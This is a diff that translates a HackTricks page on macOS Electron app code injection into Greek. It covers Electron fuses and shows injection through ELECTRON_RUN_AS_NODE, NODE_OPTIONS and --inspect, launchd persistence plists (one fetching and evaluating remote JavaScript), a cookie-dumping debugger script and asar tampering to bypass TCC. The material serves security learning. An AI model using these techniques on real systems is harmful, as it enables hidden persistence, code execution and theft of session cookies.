@@ -1,103 +1,95 @@
-# macOS Electron Applications Injection
+# Εισαγωγή σε εφαρμογές Electron στο macOS
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Άλλοι τρόποι υποστήριξης του HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
 
 </details>
 
-## Basic Information
+## Βασικές πληροφορίες
 
-If you don't know what Electron is you can find [**lots of information here**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). But for now just know that Electron runs **node**.\
-And node has some **parameters** and **env variables** that can be use to **make it execute other code** apart from the indicated file.
+Εάν δεν γνωρίζετε τι είναι το Electron, μπορείτε να βρείτε [**πολλές πληροφορίες εδώ**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Αλλά για τώρα απλά γνωρίζετε ότι το Electron τρέχει **node**.\
+Και το node έχει ορισμένες **παραμέτρους** και **μεταβλητές περιβάλλοντος** που μπορούν να χρησιμοποιηθούν για να **εκτελέσουν άλλον κώδικα** εκτός από τον καθορισμένο αρχείο.
 
-### Electron Fuses
+### Συγχώνευση Electron
 
-These techniques will be discussed next, but in recent times Electron has added several **security flags to prevent them**. These are the [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) and these are the ones used to **prevent** Electron apps in macOS from **loading arbitrary code**:
+Αυτές οι τεχνικές θα συζητηθούν παρακάτω, αλλά το Electron έχει προσθέσει πρόσφατα αρκετές **σημαίες ασφαλείας για να τις αποτρέψει**. Αυτές είναι οι [**Συγχωνεύσεις Electron**](https://www.electronjs.org/docs/latest/tutorial/fuses) και αυτές είναι αυτές που χρησιμοποιούνται για να **αποτρέψουν** τις εφαρμογές Electron στο macOS από το **φόρτωμα αυθαίρετου κώδικα**:
 
-* **`RunAsNode`**: If disabled, it prevents the use of the env var **`ELECTRON_RUN_AS_NODE`** to inject code.
-* **`EnableNodeCliInspectArguments`**: If disabled, params like `--inspect`, `--inspect-brk` won't be respected. Avoiding his way to inject code.
-* **`EnableEmbeddedAsarIntegrityValidation`**: If enabled, the loaded **`asar`** **file** will be **validated** by macOS. **Preventing** this way **code injection** by modifying the contents of this file.
-* **`OnlyLoadAppFromAsar`**: If this is enabled, instead of searching to load in the following order: **`app.asar`**, **`app`** and finally **`default_app.asar`**. It will only check and use app.asar, thus ensuring that when **combined** with the **`embeddedAsarIntegrityValidation`** fuse it is **impossible** to **load non-validated code**.
-* **`LoadBrowserProcessSpecificV8Snapshot`**: If enabled, the browser process uses the file called `browser_v8_context_snapshot.bin` for its V8 snapshot.
+* **`RunAsNode`**: Εάν είναι απενεργοποιημένο, αποτρέπει τη χρήση της μεταβλητής περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** για την εισαγωγή κώδικα.
+* **`EnableNodeCliInspectArguments`**: Εάν είναι απενεργοποιημένο, οι παράμετροι όπως `--inspect`, `--inspect-brk` δεν θα τηρούνται. Αποτρέποντας έτσι τον τρόπο εισαγωγής κώδικα.
+* **`EnableEmbeddedAsarIntegrityValidation`**: Εάν είναι ενεργοποιημένο, το φορτωμένο **`asar`** **αρχείο** θα ελεγχθεί από το macOS. Αποτρέποντας έτσι την εισαγωγή κώδικα με τροποποίηση του περιεχομένου αυτού του αρχείου.
+* **`OnlyLoadAppFromAsar`**: Εάν είναι ενεργοποιημένο, αντί να αναζητά το φόρτωμα με την ακόλουθη σειρά: **`app.asar`**, **`app`** και τελικά **`default_app.asar`**. Θα ελέγχει και θα χρησιμοποιεί μόνο το app.asar, εξασφαλίζοντας έτσι ότι όταν **συνδυαστεί** με τη συγχώνευση **`embeddedAsarIntegrityValidation`** είναι **αδύνατο** να φορτωθεί μη επικυρωμένος κώδικας.
+* **`LoadBrowserProcessSpecificV8Snapshot`**: Εάν είναι ενεργοποιημένο, η διεργασία περιήγησης χρησιμοποιεί το αρχείο που ονομάζεται `browser_v8_context_snapshot.bin` για το V8 snapshot της.
 
-Another interesting fuse that won't be preventing code injection is:
+Μια άλλη ενδιαφέρουσα συγχώνευση που δεν θα αποτρέπει την εισαγωγή κώδικα είναι:
 
-* **EnableCookieEncryption**: If enabled, the cookie store on disk is encrypted using OS level cryptography keys.
+* **EnableCookieEncryption**: Εάν είναι ενεργοποιημένο, η αποθήκευση των cookies στον δίσκο κρυπτογραφείται χρησιμοποιώντας κλειδιά κρυπτογραφίας σε επίπεδο λειτουργικού συστήματος.
 
-### Checking Electron Fuses
+### Έλεγχος των συγχωνεύσεων Electron
 
-You can **check these flags** from an application with:
-
+Μπορείτε να **ελέγξετε αυτές τις σημαίες** από μια εφαρμογή με:
 ```bash
 npx @electron/fuses read --app /Applications/Slack.app
 
 Analyzing app: Slack.app
 Fuse Version: v1
-  RunAsNode is Disabled
-  EnableCookieEncryption is Enabled
-  EnableNodeOptionsEnvironmentVariable is Disabled
-  EnableNodeCliInspectArguments is Disabled
-  EnableEmbeddedAsarIntegrityValidation is Enabled
-  OnlyLoadAppFromAsar is Enabled
-  LoadBrowserProcessSpecificV8Snapshot is Disabled
+RunAsNode is Disabled
+EnableCookieEncryption is Enabled
+EnableNodeOptionsEnvironmentVariable is Disabled
+EnableNodeCliInspectArguments is Disabled
+EnableEmbeddedAsarIntegrityValidation is Enabled
+OnlyLoadAppFromAsar is Enabled
+LoadBrowserProcessSpecificV8Snapshot is Disabled
 ```
+### Τροποποίηση των Electron Fuses
 
-### Modifying Electron Fuses
+Όπως αναφέρονται στα [**έγγραφα**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), η διαμόρφωση των **Electron Fuses** γίνεται μέσα στο **Electron binary** που περιέχει κάπου τον χαρακτήρα **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.
 
-As the [**docs mention**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), the configuration of the **Electron Fuses** are configured inside the **Electron binary** which contains somewhere the string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.
-
-In macOS applications this is typically in `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
-
+Στις εφαρμογές macOS, αυτό συνήθως βρίσκεται στη διαδρομή `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`.
 ```bash
 grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
 Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
 ```
-
-You could load this file in [https://hexed.it/](https://hexed.it/) and search for the previous string. After this string you can see in ASCII a number "0" or "1" indicating if each fuse is disabled or enabled. Just modify the hex code (`0x30` is `0` and `0x31` is `1`) to **modify the fuse values**.
+Μπορείτε να φορτώσετε αυτό το αρχείο στο [https://hexed.it/](https://hexed.it/) και να αναζητήσετε το προηγούμενο string. Μετά από αυτό το string, μπορείτε να δείτε σε ASCII έναν αριθμό "0" ή "1" που υποδηλώνει εάν κάθε ασφάλεια είναι απενεργοποιημένη ή ενεργοποιημένη. Απλά τροποποιήστε τον κωδικό hex (`0x30` είναι το `0` και `0x31` είναι το `1`) για να **τροποποιήσετε τις τιμές των ασφαλειών**.
 
 <figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Note that if you try to **overwrite** the **`Electron Framework` binary** inside an application with these bytes modified, the app won't run.
+Σημειώστε ότι εάν προσπαθήσετε να **αντικαταστήσετε** το **δυαδικό αρχείο του Electron Framework** μέσα σε μια εφαρμογή με αυτά τα τροποποιημένα bytes, η εφαρμογή δεν θα εκτελεστεί.
 
-## RCE adding code to Electron Applications
+## RCE προσθήκη κώδικα σε εφαρμογές Electron
 
-There could be **external JS/HTML files** that an Electron App is using, so an attacker could inject code in these files whose signature won't be checked and execute arbitrary code in the context of the app.
+Μπορεί να υπάρχουν **εξωτερικά αρχεία JS/HTML** που χρησιμοποιεί μια εφαρμογή Electron, οπότε ένας επιτιθέμενος μπορεί να εισχωρήσει κώδικα σε αυτά τα αρχεία, η υπογραφή των οποίων δεν θα ελεγχθεί, και να εκτελέσει αυθαίρετο κώδικα στο πλαίσιο της εφαρμογής.
 
 {% hint style="danger" %}
-However, at the moment there are 2 limitations:
+Ωστόσο, αυτή τη στιγμή υπάρχουν 2 περιορισμοί:
 
-* The **`kTCCServiceSystemPolicyAppBundles`** permission is **needed** to modify an App, so by default this is no longer possible.
-* The compiled **`asap`** file usually has the fuses **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** `enabled`
+* Απαιτείται η άδεια **`kTCCServiceSystemPolicyAppBundles`** για να τροποποιηθεί μια εφαρμογή, οπότε από προεπιλογή αυτό δεν είναι πλέον δυνατό.
+* Το συνταγμένο αρχείο **`asap`** συνήθως έχει τις ασφάλειες **`embeddedAsarIntegrityValidation`** και **`onlyLoadAppFromAsar`** ενεργοποιημένες
 
-Making this attack path more complicated (or impossible).
+Αυτό καθιστά πιο περίπλοκη (ή αδύνατη) αυτήν τη διαδρομή επίθεσης.
 {% endhint %}
 
-Note that it's possible to bypass the requirement of **`kTCCServiceSystemPolicyAppBundles`** by copying the application to another directory (like **`/tmp`**), renaming the folder **`app.app/Contents`** to **`app.app/NotCon`**, **modifying** the **asar** file with your **malicious** code, renaming it back to **`app.app/Contents`** and executing it.
+Σημειώστε ότι είναι δυνατό να παρακάμψετε την απαίτηση της **`kTCCServiceSystemPolicyAppBundles`** αντιγράφοντας την εφαρμογή σε έναν άλλο κατάλογο (όπως το **`/tmp`**), μετονομάζοντας τον φάκελο **`app.app/Contents`** σε **`app.app/NotCon`**, **τροποποιώντας** το αρχείο **asar** με τον **κακόβουλο** κώδικά σας, μετονομάζοντάς το πίσω σε **`app.app/Contents`** και εκτελώντας το.
 
-You can unpack the code from the asar file with:
-
+Μπορείτε να αποσυμπιέσετε τον κώδικα από το αρχείο asar με:
 ```bash
 npx asar extract app.asar app-decomp
 ```
-
-And pack it back after having modified it with:
-
+Και επανασυσκευάστε το αρχείο μετά την τροποποίησή του με:
 ```bash
 npx asar pack app-decomp app-new.asar
 ```
+## Εκτέλεση κώδικα απομακρυσμένης εκτέλεσης (RCE) με το `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>
 
-## RCE with `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>
-
-According to [**the docs**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), if this env variable is set, it will start the process as a normal Node.js process.
+Σύμφωνα με [**τα έγγραφα**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), εάν αυτή η μεταβλητή περιβάλλοντος είναι ορισμένη, θα ξεκινήσει τη διεργασία ως μια κανονική διεργασία Node.js.
 
 {% code overflow="wrap" %}
 ```bash
@@ -109,40 +101,38 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 {% endcode %}
 
 {% hint style="danger" %}
-If the fuse **`RunAsNode`** is disabled the env var **`ELECTRON_RUN_AS_NODE`** will be ignored, and this won't work.
+Εάν ο φούσκας **`RunAsNode`** είναι απενεργοποιημένος, η μεταβλητή περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** θα αγνοηθεί και αυτό δεν θα λειτουργήσει.
 {% endhint %}
 
-### Injection from the App Plist
+### Έγχυση από το App Plist
 
-As [**proposed here**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), you could abuse this env variable in a plist to maintain persistence:
-
+Όπως [**προτείνεται εδώ**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), μπορείτε να καταχραστείτε αυτήν τη μεταβλητή περιβάλλοντος σε ένα plist για να διατηρήσετε την επιμονή:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>EnvironmentVariables</key>
-    <dict>
-           <key>ELECTRON_RUN_AS_NODE</key>
-           <string>true</string>
-    </dict>
-    <key>Label</key>
-    <string>com.xpnsec.hideme</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
-        <string>-e</string>
-        <string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
+<key>EnvironmentVariables</key>
+<dict>
+<key>ELECTRON_RUN_AS_NODE</key>
+<string>true</string>
+</dict>
+<key>Label</key>
+<string>com.xpnsec.hideme</string>
+<key>ProgramArguments</key>
+<array>
+<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
+<string>-e</string>
+<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
+</array>
+<key>RunAtLoad</key>
+<true/>
 </dict>
 </plist>
 ```
+## RCE με το `NODE_OPTIONS`
 
-## RCE with `NODE_OPTIONS`
-
-You can store the payload in a different file and execute it:
+Μπορείτε να αποθηκεύσετε το payload σε ένα διαφορετικό αρχείο και να το εκτελέσετε:
 
 {% code overflow="wrap" %}
 ```bash
@@ -155,35 +145,33 @@ NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Di
 {% endcode %}
 
 {% hint style="danger" %}
-If the fuse **`EnableNodeOptionsEnvironmentVariable`** is **disabled**, the app will **ignore** the env var **NODE\_OPTIONS** when launched unless the env variable **`ELECTRON_RUN_AS_NODE`** is set, which will be also **ignored** if the fuse **`RunAsNode`** is disabled.
+Εάν η παράμετρος **`EnableNodeOptionsEnvironmentVariable`** είναι **απενεργοποιημένη**, η εφαρμογή θα **αγνοήσει** τη μεταβλητή περιβάλλοντος **NODE\_OPTIONS** κατά την εκκίνηση, εκτός αν η μεταβλητή περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** είναι ορισμένη, η οποία θα **αγνοηθεί** επίσης εάν η παράμετρος **`RunAsNode`** είναι απενεργοποιημένη.
 
-If you don't set **`ELECTRON_RUN_AS_NODE`** , you will find the **error**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
+Εάν δεν ορίσετε την παράμετρο **`ELECTRON_RUN_AS_NODE`**, θα συναντήσετε το **σφάλμα**: `Οι περισσότερες NODE_OPTIONs δεν υποστηρίζονται σε συσκευασμένες εφαρμογές. Δείτε την τεκμηρίωση για περισσότερες λεπτομέρειες.`
 {% endhint %}
 
-### Injection from the App Plist
+### Έγχυση από το Plist της εφαρμογής
 
-You could abuse this env variable in a plist to maintain persistence adding these keys:
-
+Μπορείτε να καταχραστείτε αυτήν τη μεταβλητή περιβάλλοντος σε ένα plist για να διατηρήσετε την επιμονή προσθέτοντας αυτά τα κλειδιά:
 ```xml
 <dict>
-    <key>EnvironmentVariables</key>
-    <dict>
-           <key>ELECTRON_RUN_AS_NODE</key>
-           <string>true</string>
-           <key>NODE_OPTIONS</key>
-           <string>--require /tmp/payload.js</string>
-    </dict>
-    <key>Label</key>
-    <string>com.hacktricks.hideme</string>
-    <key>RunAtLoad</key>
-    <true/>
+<key>EnvironmentVariables</key>
+<dict>
+<key>ELECTRON_RUN_AS_NODE</key>
+<string>true</string>
+<key>NODE_OPTIONS</key>
+<string>--require /tmp/payload.js</string>
+</dict>
+<key>Label</key>
+<string>com.hacktricks.hideme</string>
+<key>RunAtLoad</key>
+<true/>
 </dict>
 ```
+## RCE με επιθεώρηση
 
-## RCE with inspecting
-
-According to [**this**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), if you execute an Electron application with flags such as **`--inspect`**, **`--inspect-brk`** and **`--remote-debugging-port`**, a **debug port will be open** so you can connect to it (for example from Chrome in `chrome://inspect`) and you will be able to **inject code on it** or even launch new processes.\
-For example:
+Σύμφωνα με [**αυτό**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), αν εκτελέσετε μια εφαρμογή Electron με σημαίες όπως **`--inspect`**, **`--inspect-brk`** και **`--remote-debugging-port`**, θα ανοίξει ένα **θύρα επιθεώρησης** ώστε να μπορείτε να συνδεθείτε σε αυτήν (για παράδειγμα από το Chrome στο `chrome://inspect`) και θα μπορείτε να **εισάγετε κώδικα σε αυτήν** ή ακόμα και να εκκινήσετε νέες διεργασίες.\
+Για παράδειγμα:
 
 {% code overflow="wrap" %}
 ```bash
@@ -194,15 +182,14 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 {% endcode %}
 
 {% hint style="danger" %}
-If the fuse **`EnableNodeCliInspectArguments`** is disabled, the app will **ignore node parameters** (such as `--inspect`) when launched unless the env variable **`ELECTRON_RUN_AS_NODE`** is set, which will be also **ignored** if the fuse **`RunAsNode`** is disabled.
+Εάν ο φούσκα **`EnableNodeCliInspectArguments`** είναι απενεργοποιημένη, η εφαρμογή θα **αγνοεί τις παραμέτρους του node** (όπως `--inspect`) όταν ξεκινάει, εκτός αν η μεταβλητή περιβάλλοντος **`ELECTRON_RUN_AS_NODE`** είναι ορισμένη, η οποία θα **αγνοηθεί** επίσης εάν η φούσκα **`RunAsNode`** είναι απενεργοποιημένη.
 
-However, you could still use the **electron param `--remote-debugging-port=9229`** but the previous payload won't work to execute other processes.
+Ωστόσο, μπορείτε ακόμα να χρησιμοποιήσετε την παράμετρο **electron `--remote-debugging-port=9229`** αλλά το προηγούμενο φορτίο δεν θα λειτουργήσει για να εκτελέσει άλλες διεργασίες.
 {% endhint %}
 
-Using the param **`--remote-debugging-port=9222`** it's possible to steal some information from the Electron App like the **history** (with GET commands) or the **cookies** of the browser (as they are **decrypted** inside the browser and there is a **json endpoint** that will give them).
+Χρησιμοποιώντας την παράμετρο **`--remote-debugging-port=9222`** είναι δυνατόν να κλέψετε ορισμένες πληροφορίες από την εφαρμογή Electron, όπως το **ιστορικό** (με GET εντολές) ή τα **cookies** του προγράμματος περιήγησης (καθώς αποκρυπτογραφούνται μέσα στον προγράμματα περιήγησης και υπάρχει ένα **json endpoint** που θα τα δώσει).
 
-You can learn how to do that in [**here**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) and [**here**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) and use the automatic tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) or a simple script like:
-
+Μπορείτε να μάθετε πώς να το κάνετε αυτό [**εδώ**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) και [**εδώ**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) και να χρησιμοποιήσετε το αυτόματο εργαλείο [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ή ένα απλό σενάριο όπως:
 ```python
 import websocket
 ws = websocket.WebSocket()
@@ -210,44 +197,40 @@ ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00",
 ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
 print(ws.recv()
 ```
+Σε [**αυτή την ανάρτηση στο blog**](https://hackerone.com/reports/1274695), αυτή η αποσφαλμάτωση καταχράται για να κατεβάσει ο Headless Chrome **οποιοδήποτε αρχείο σε οποιαδήποτε τοποθεσία**.
 
-In [**this blogpost**](https://hackerone.com/reports/1274695), this debugging is abused to make a headless chrome **download arbitrary files in arbitrary locations**.
+### Εισαγωγή από το App Plist
 
-### Injection from the App Plist
-
-You could abuse this env variable in a plist to maintain persistence adding these keys:
-
+Μπορείτε να καταχραστείτε αυτήν τη μεταβλητή περιβάλλοντος σε ένα plist για να διατηρήσετε την επιμονή προσθέτοντας αυτά τα κλειδιά:
 ```xml
 <dict>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
-        <string>--inspect</string>
-    </array>
-    <key>Label</key>
-    <string>com.hacktricks.hideme</string>
-    <key>RunAtLoad</key>
-    <true/>
+<key>ProgramArguments</key>
+<array>
+<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
+<string>--inspect</string>
+</array>
+<key>Label</key>
+<string>com.hacktricks.hideme</string>
+<key>RunAtLoad</key>
+<true/>
 </dict>
 ```
-
-## TCC Bypass abusing Older Versions
+## Παράκαμψη TCC με κατάχρηση παλαιότερων εκδόσεων
 
 {% hint style="success" %}
-The TCC daemon from macOS doesn't check the executed version of the application. So if you **cannot inject code in an Electron application** with any of the previous techniques you could download a previous version of the APP and inject code on it as it will still get the TCC privileges (unless Trust Cache prevents it).
+Ο δαίμονας TCC του macOS δεν ελέγχει την εκτελούμενη έκδοση της εφαρμογής. Έτσι, αν **δεν μπορείτε να εισχωρήσετε κώδικα σε μια εφαρμογή Electron** με καμία από τις προηγούμενες τεχνικές, μπορείτε να κατεβάσετε μια προηγούμενη έκδοση της εφαρμογής και να εισχωρήσετε κώδικα σε αυτήν, καθώς θα λάβει ακόμα τα προνόμια TCC (εκτός αν το Trust Cache το εμποδίζει).
 {% endhint %}
 
-## Run non JS Code
+## Εκτέλεση μη JS κώδικα
 
-The previous techniques will allow you to run **JS code inside the process of the electron application**. However, remember that the **child processes run under the same sandbox profile** as the parent application and **inherit their TCC permissions**.\
-Therefore, if you want to abuse entitlements to access the camera or microphone for example, you could just **run another binary from the process**.
+Οι προηγούμενες τεχνικές θα σας επιτρέψουν να εκτελέσετε **JS κώδικα μέσα στη διεργασία της εφαρμογής Electron**. Ωστόσο, θυμηθείτε ότι οι **υποδιεργασίες εκτελούνται με το ίδιο προφίλ ασφαλείας** με τη γονική εφαρμογή και **κληρονομούν τα δικαιώματα TCC** της.\
+Επομένως, αν θέλετε να καταχραστείτε δικαιώματα για πρόσβαση στην κάμερα ή το μικρόφωνο, για παράδειγμα, μπορείτε απλά να **εκτελέσετε ένα άλλο δυαδικό αρχείο από τη διεργασία**.
 
-## Automatic Injection
+## Αυτόματη εισαγωγή
 
-The tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) can be easily used to **find vulnerable electron applications** installed and inject code on them. This tool will try to use the **`--inspect`** technique:
+Το εργαλείο [**electroniz3r**](https://github.com/r3ggi/electroniz3r) μπορεί να χρησιμοποιηθεί εύκολα για να **βρεί ευπάθειες σε εγκατεστημένες εφαρμογές Electron** και να εισάγει κώδικα σε αυτές. Αυτό το εργαλείο θα προσπαθήσει να χρησιμοποιήσει την τεχνική **`--inspect`**:
 
-You need to compile it yourself and can use it like this:
-
+Πρέπει να το μεταγλωτίσετε μόνοι σας και μπορείτε να το χρησιμοποιήσετε ως εξής:
 ```bash
 # Find electron apps
 ./electroniz3r list-apps
@@ -283,8 +266,7 @@ You can now kill the app using `kill -9 57739`
 The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
 Shell binding requested. Check `nc 127.0.0.1 12345`
 ```
-
-## References
+## Αναφορές
 
 * [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
 * [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
@@ -292,14 +274,14 @@ Shell binding requested. Check `nc 127.0.0.1 12345`
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
 
 </details>
